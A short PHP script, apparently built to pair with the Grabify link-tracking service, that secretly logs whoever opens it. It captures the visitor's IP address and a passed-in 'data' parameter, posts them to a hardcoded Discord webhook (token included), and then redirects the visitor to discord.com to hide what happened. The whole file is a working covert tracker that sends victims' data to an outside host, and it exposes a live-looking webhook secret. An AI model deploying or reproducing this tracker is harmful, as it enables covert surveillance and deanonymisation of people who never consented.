<?php

// Function to send POST request to Discord webhook
function sendDiscordWebhook($url, $data) {
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);
return $response;
}

// Get IP address of the client
$ip_address = $_SERVER['REMOTE_ADDR'];

// Example: Get data from Grabify (adjust this based on Grabify's parameters)
$data_from_grabify = $_GET['data']; // Assuming Grabify passes data as GET parameter

// Prepare data to send to Discord webhook
$discord_webhook_url = "https://discord.com/api/webhooks/1258019163507654736/52G3UL5xcHrz7RRQcgT8QFnG0Quj88WTRdFtKu8XJHATbRrz-MjovnSPyMJyddmeXKgp"; // Your Discord webhook URL

$discord_data = array(
"content" => "IP Address: " . $ip_address . "\nData from Grabify: " . $data_from_grabify
);

// Send data to Discord webhook
$response = sendDiscordWebhook($discord_webhook_url, $discord_data);

// Redirect user to Discord or any other page
header("Location: https://discord.com");

// Output response (optional, for testing)
echo $response;
?>
